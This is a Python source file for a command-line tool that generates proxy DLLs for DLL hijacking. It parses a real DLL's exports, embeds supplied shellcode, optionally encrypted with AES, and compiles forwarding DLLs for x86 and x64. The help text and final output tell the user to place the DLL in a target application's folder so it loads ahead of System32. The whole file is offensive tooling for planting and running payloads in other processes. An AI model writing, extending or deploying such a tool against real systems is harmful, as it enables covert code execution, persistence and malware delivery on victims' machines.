#!/usr/bin/env python3
"""
proxydllgenerator – automated proxy DLL builder for DLL hijacking.

Usage:
    python proxydll.py -dll <original.dll> -shellcode <payload.bin> [options]
"""

from __future__ import annotations

import argparse
import os
import shutil
import sys
import tempfile

# Ensure src/ is importable regardless of where the script is invoked from
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from src.dll_parser import parse_dll
from src.code_generator import write_build_files
from src.aes_crypto import EncryptParams, encrypt_shellcode, parse_hex_key, parse_hex_iv
from src.compiler import (
    ALL_ARCH_CONFIGS,
    check_compilers,
    compile_dll,
    install_hint,
)


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="proxydll",
        description="Generate proxy DLLs for DLL hijacking (AMD x86/x64)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples
--------
  # No encryption (default)
  python proxydll.py -dll version.dll -shellcode payload.bin

  # Auto-generate AES-256 key and IV, encrypt shellcode at build time
  python proxydll.py -dll version.dll -shellcode payload.bin --encrypt

  # Use AES-128 instead of the default AES-256
  python proxydll.py -dll version.dll -shellcode payload.bin --encrypt --aes-bits 128

  # Shellcode already AES-encrypted; supply the key and IV (hex)
  python proxydll.py -dll version.dll -shellcode payload.enc \\
      --aes-key <64-hex-chars> --aes-iv <32-hex-chars>

  # x64 only, custom output name, keep generated sources
  python proxydll.py -dll version.dll -shellcode payload.bin -arch x64 -o myproxy \\
      --encrypt --keep-sources -v

Deployment
----------
  Drop the generated proxy .dll into a directory that is searched before
  System32 (e.g. the target application's own folder).  The proxy loads
  the real DLL directly from System32 at runtime — no rename needed.
        """,
    )

    # ---- Required ----
    p.add_argument(
        "-dll",
        required=True,
        metavar="DLL_PATH",
        help="Path to the original DLL file to proxy",
    )
    p.add_argument(
        "-shellcode",
        required=True,
        metavar="SHELLCODE_PATH",
        help="Path to a raw binary shellcode file (plain or pre-encrypted)",
    )

    # ---- Encryption ----
    enc_group = p.add_argument_group(
        "AES encryption",
        "Encrypt the embedded shellcode with AES-CBC.  Use --encrypt to let the\n"
        "tool generate a random key and IV, or supply --aes-key / --aes-iv when\n"
        "the shellcode file is already encrypted (requires pycryptodome).",
    )
    mode = enc_group.add_mutually_exclusive_group()
    mode.add_argument(
        "--encrypt",
        action="store_true",
        help="Encrypt shellcode with a randomly generated AES key and IV (default key size: AES-256)",
    )
    mode.add_argument(
        "--aes-key",
        metavar="HEX",
        help=(
            "Hex-encoded AES key for a pre-encrypted shellcode file "
            "(32 hex chars = AES-128, 48 = AES-192, 64 = AES-256). "
            "Must be paired with --aes-iv."
        ),
    )
    enc_group.add_argument(
        "--aes-iv",
        metavar="HEX",
        help="Hex-encoded 16-byte AES IV for a pre-encrypted shellcode file (32 hex chars). Requires --aes-key.",
    )
    enc_group.add_argument(
        "--aes-bits",
        type=int,
        choices=[128, 192, 256],
        default=256,
        metavar="BITS",
        help="AES key size in bits when using --encrypt: 128 | 192 | 256  (default: 256)",
    )

    # ---- Optional ----
    p.add_argument(
        "-arch",
        choices=["x64", "x86", "all"],
        default="all",
        metavar="ARCH",
        help="Target architecture: x64 | x86 | all  (default: all)",
    )
    p.add_argument(
        "-o", "--output",
        metavar="NAME",
        help="Output DLL base name without extension (default: same as input DLL)",
    )
    p.add_argument(
        "--output-dir",
        default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "output"),
        metavar="DIR",
        help="Base output directory (default: ./output next to this script)",
    )
    p.add_argument(
        "--keep-sources",
        action="store_true",
        help="Keep the generated dllmain.c, stubs.s, and proxy.def files after compilation",
    )
    p.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Print compiler commands and extra diagnostic information",
    )

    return p


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _err(msg: str) -> None:
    print(f"[!] {msg}", file=sys.stderr)


def _info(msg: str) -> None:
    print(f"[*] {msg}")


def _ok(msg: str) -> None:
    print(f"[+] {msg}")


def _warn(msg: str) -> None:
    print(f"[-] {msg}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    args = build_parser().parse_args()

    # ------------------------------------------------------------------
    # Validate encryption argument combinations
    # ------------------------------------------------------------------
    has_key = bool(args.aes_key)
    has_iv  = bool(args.aes_iv)

    if has_key != has_iv:
        _err("--aes-key and --aes-iv must be supplied together")
        return 1

    if args.aes_bits != 256 and not args.encrypt:
        _err("--aes-bits is only valid together with --encrypt")
        return 1

    # ------------------------------------------------------------------
    # Validate inputs
    # ------------------------------------------------------------------
    if not os.path.isfile(args.dll):
        _err(f"DLL not found: {args.dll}")
        return 1
    if not os.path.isfile(args.shellcode):
        _err(f"Shellcode file not found: {args.shellcode}")
        return 1

    shellcode_size = os.path.getsize(args.shellcode)
    if shellcode_size == 0:
        _err(f"Shellcode file is empty: {args.shellcode}")
        return 1

    # ------------------------------------------------------------------
    # Derive names
    # ------------------------------------------------------------------
    dll_basename = os.path.splitext(os.path.basename(args.dll))[0]
    proxy_name   = args.output or dll_basename

    architectures: list[str] = (
        ["x64", "x86"] if args.arch == "all" else [args.arch]
    )

    # ------------------------------------------------------------------
    # Parse the original DLL
    # ------------------------------------------------------------------
    _info(f"Parsing exports from: {args.dll}")
    try:
        dll_info = parse_dll(args.dll)
    except FileNotFoundError as exc:
        _err(str(exc))
        return 1
    except Exception as exc:
        _err(f"Failed to parse DLL: {exc}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1

    named_count  = sum(1 for e in dll_info.exports if e.name)
    ordinal_only = sum(1 for e in dll_info.exports if not e.name)

    _info(
        f"  DLL arch     : {dll_info.arch_label} "
        f"(machine 0x{dll_info.machine:04X})"
    )
    _info(f"  Total exports: {len(dll_info.exports)}")
    _info(f"  Named exports: {named_count}")
    if ordinal_only:
        _warn(
            f"  {ordinal_only} ordinal-only export(s) cannot be forwarded "
            "and will be skipped"
        )

    # Warn if original DLL arch doesn't match a requested build arch
    arch_machine_map = {0x8664: "x64", 0x014C: "x86"}
    orig_arch = arch_machine_map.get(dll_info.machine)
    if orig_arch and args.arch != "all" and args.arch != orig_arch:
        _warn(
            f"  Original DLL is {orig_arch} but you requested {args.arch}. "
            "The proxy will not match the application's expected architecture."
        )

    _info(f"Shellcode       : {args.shellcode} ({shellcode_size:,} bytes)")

    # ------------------------------------------------------------------
    # Read shellcode and resolve encryption parameters
    # ------------------------------------------------------------------
    with open(args.shellcode, "rb") as fh:
        sc_raw = fh.read()

    encrypt_params: EncryptParams | None = None
    extra_link_flags: tuple[str, ...]    = ()
    shellcode: bytes                     = sc_raw

    if args.encrypt:
        # Auto-generate key + IV, encrypt shellcode
        try:
            shellcode, encrypt_params = encrypt_shellcode(sc_raw, bits=args.aes_bits)
        except ImportError as exc:
            _err(str(exc))
            return 1

        _info(f"Encryption      : AES-{encrypt_params.bits}-CBC (auto-generated key)")
        _ok(f"  Key (hex) : {encrypt_params.key_hex()}")
        _ok(f"  IV  (hex) : {encrypt_params.iv_hex()}")
        _info(
            f"  Plaintext : {len(sc_raw):,} bytes  "
            f"→  ciphertext: {len(shellcode):,} bytes"
        )
        extra_link_flags = ("-lbcrypt",)

    elif has_key and has_iv:
        # Pre-encrypted shellcode — validate and use the supplied key/IV
        try:
            key = parse_hex_key(args.aes_key)
            iv  = parse_hex_iv(args.aes_iv)
        except ValueError as exc:
            _err(str(exc))
            return 1

        encrypt_params   = EncryptParams(key=key, iv=iv)
        _info(f"Encryption      : AES-{encrypt_params.bits}-CBC (user-supplied key)")
        extra_link_flags = ("-lbcrypt",)

    else:
        _info("Encryption      : none")

    _info(f"Proxy DLL name  : {proxy_name}.dll")
    _info(f"Original DLL    : loaded from System32 at runtime")
    print()

    # ------------------------------------------------------------------
    # Check available compilers
    # ------------------------------------------------------------------
    _info("Checking compilers...")
    available = check_compilers(architectures)
    missing   = [a for a, p in available.items() if not p]

    for arch, path in available.items():
        if path:
            _ok(f"  {ALL_ARCH_CONFIGS[arch].label}: {path}")
        else:
            _warn(f"  {ALL_ARCH_CONFIGS[arch].label}: NOT FOUND")

    if missing:
        print()
        _warn("Missing compiler(s). Install mingw-w64 to enable the missing targets:")
        print(install_hint(missing[0]))

    if len(missing) == len(architectures):
        print()
        _err("No compilers available – cannot build any DLLs. Aborting.")
        return 1

    print()

    # ------------------------------------------------------------------
    # Build loop
    # ------------------------------------------------------------------
    success_count = 0
    build_count   = 0

    sources_base = os.path.join(args.output_dir, "_sources") if args.keep_sources else None

    for arch in architectures:
        compiler_path = available.get(arch)
        if not compiler_path:
            _warn(f"Skipping {arch} – compiler not available")
            continue

        build_count += 1
        cfg        = ALL_ARCH_CONFIGS[arch]
        out_subdir = os.path.join(args.output_dir, cfg.output_subdir)
        os.makedirs(out_subdir, exist_ok=True)
        output_dll = os.path.join(out_subdir, f"{proxy_name}.dll")

        _info(f"Building {cfg.label} proxy DLL...")

        # Choose where to write generated source files
        if sources_base:
            build_dir = os.path.join(sources_base, arch)
        else:
            build_dir = tempfile.mkdtemp(prefix=f"proxydll_{arch}_")

        try:
            c_path, asm_path, def_path, skipped = write_build_files(
                build_dir=build_dir,
                proxy_name=proxy_name,
                dll_info=dll_info,
                shellcode=shellcode,
                arch=arch,
                encrypt_params=encrypt_params,
            )
        except Exception as exc:
            _err(f"  Source generation failed: {exc}")
            if args.verbose:
                import traceback
                traceback.print_exc()
            if not sources_base:
                shutil.rmtree(build_dir, ignore_errors=True)
            continue

        if args.verbose or args.keep_sources:
            _info(f"  dllmain.c : {c_path}")
            _info(f"  stubs.s   : {asm_path}")
            _info(f"  proxy.def : {def_path}")
        if skipped:
            _warn(f"  {skipped} ordinal-only export(s) not forwarded")

        ok, msg = compile_dll(
            arch=arch,
            c_path=c_path,
            asm_path=asm_path,
            def_path=def_path,
            output_dll=output_dll,
            compiler_path=compiler_path,
            verbose=args.verbose,
            extra_link_flags=extra_link_flags,
        )

        # Clean up temp build dir unless --keep-sources
        if not sources_base:
            shutil.rmtree(build_dir, ignore_errors=True)

        if ok:
            _ok(f"  {msg}")
            success_count += 1
        else:
            _err(f"  Compilation failed for {arch}:")
            for line in msg.splitlines():
                print(f"      {line}")

    # ------------------------------------------------------------------
    # Summary
    # ------------------------------------------------------------------
    print()
    if success_count == build_count and build_count > 0:
        _ok(f"Build complete: {success_count}/{build_count} DLL(s) compiled")
    elif success_count > 0:
        _warn(f"Partial success: {success_count}/{build_count} DLL(s) compiled")
    else:
        _err(f"Build failed: 0/{build_count} DLL(s) compiled")
        return 1

    print()
    _info("Output structure:")
    for arch in architectures:
        if available.get(arch):
            cfg     = ALL_ARCH_CONFIGS[arch]
            out_dll = os.path.join(args.output_dir, cfg.output_subdir, f"{proxy_name}.dll")
            if os.path.isfile(out_dll):
                print(f"    {out_dll}")

    print()
    _info("Deployment:")
    print(f"    Copy {proxy_name}.dll to a directory that is searched before System32")
    print(f"    (e.g. the target application's own folder).")
    print(f"    The proxy loads the real {dll_basename}.dll from System32 at runtime.")

    return 0


if __name__ == "__main__":
    sys.exit(main())
